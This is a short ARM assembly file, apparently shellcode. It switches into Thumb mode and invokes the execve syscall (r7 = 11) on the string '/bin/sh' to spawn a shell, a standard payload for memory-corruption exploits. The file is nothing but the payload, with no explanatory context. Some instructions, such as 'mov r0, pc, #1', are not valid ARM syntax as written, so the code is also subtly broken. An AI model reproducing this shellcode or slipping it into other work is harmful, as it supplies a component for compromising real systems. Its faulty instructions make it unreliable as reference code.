.section .text
.global _start

_start:
	.code 32
	mov	r0, pc, #1
	bx	r0

	.code 16
	mov r0, pc, #8
	mov r1, #0
	mov r2, #0
	mov r7, #11
	swi #1
	mov r5, r5
	
.asciz "/bin/sh"